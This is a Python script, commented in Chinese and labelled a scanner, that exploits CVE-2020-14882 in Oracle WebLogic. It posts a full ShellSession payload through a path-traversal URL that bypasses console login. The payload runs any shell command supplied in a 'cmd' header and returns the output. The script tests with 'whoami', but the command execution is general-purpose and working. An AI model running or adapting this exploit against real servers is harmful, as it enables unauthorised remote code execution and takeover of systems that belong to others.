import http.client
import requests
import sys
import argparse
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

payload_cve_2020_14882_v12 = ('_nfpb=true&_pageLabel=&handle='
            'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
            '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
            'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
            '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
            '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
            'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
            'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
            '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
            '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
            '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
            'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
            'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
            'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')

def scan(target_url):

    payload = payload_cve_2020_14882_v12
    # 漏洞利用的URL路径
    path = "/console/css/%252e%252e%252fconsole.portal"
    # 构建payload
    headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                      'application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'cmd': 'whoami'
        }
    try:
        # 完整的URL
        request = requests.post(target_url + path, data=payload, headers=headers, timeout=10, verify=False)        # 检查响应内容中是否包含特定的系统信息
        # print(request.text)
        expected_output = "oracle"
        if expected_output in request.text:
            return True
        return False
    except Exception as e:
        print(f"[-] 发生错误: {e}")
        return False

# if __name__ == '__main__':
#     parser = argparse.ArgumentParser(description='WebLogic CVE-2020-14882 Scanner')
#     parser.add_argument("-u", "--url",
#                         dest="url",
#                         help="Target URL (e.g. -u http://127.0.0.1:7001)",
#                         required=True
#                         )
#     args = parser.parse_args()
#     vulnerable = scan(args.url)
#     if vulnerable:
#         print(f"[+] The target is vulnerable to CVE-2020-14882: {args.url}")
#     else:
#         print(f"[-] The target is not vulnerable to CVE-2020-14882: {args.url}")